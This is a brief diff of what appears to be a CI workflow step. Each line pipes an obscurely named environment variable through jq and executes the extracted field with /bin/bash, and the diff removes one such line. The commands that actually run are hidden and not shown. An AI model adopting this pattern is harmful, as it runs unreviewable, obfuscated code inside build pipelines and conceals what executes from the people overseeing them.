@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$mlwc35" | jq -r .tipw70 | /bin/bash
           printf '%s' "$pnt9616" | jq -r .m490 | /bin/bash
-          printf '%s' "$rdf909" | jq -r .hgnge1 | /bin/bash
           printf '%s' "$psg488" | jq -r .yvdo4 | /bin/bash
 
       - name: Archive results
